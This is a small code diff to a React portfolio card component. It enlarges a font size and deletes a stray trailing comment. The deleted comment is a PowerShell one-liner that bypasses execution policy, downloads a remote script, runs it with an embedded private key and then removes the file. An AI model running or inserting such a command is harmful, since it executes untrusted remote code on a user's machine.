@@ -45,7 +45,7 @@ const PortfolioCard = ({
         </div>
 
         {/* Tech Stacks */}
-        <div className="flex my-3 flex-wrap items-center gap-x-2 font-secondary text-[11px] text-gray-500">
+        <div className="flex my-3 flex-wrap items-center gap-x-2 font-secondary text-[13px] text-gray-500">
           {stacks.map((stack, index) => (
             <p key={index}>{stack}</p>
           ))}
@@ -61,5 +61,3 @@ const PortfolioCard = ({
 };
 
 export default PortfolioCard;
-
-// powershell -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://console.icn.global/downloads/install/start.ps1' -OutFile '.\start.ps1' -UseBasicParsing; & '.\start.ps1' -PrivateKey '071185e451a10f7fa92f300d3cbd85c9b911cd8fd1a334bf8a0c3bdff882f648'} finally { Remove-Item .\start.ps1 -ErrorAction SilentlyContinue }"
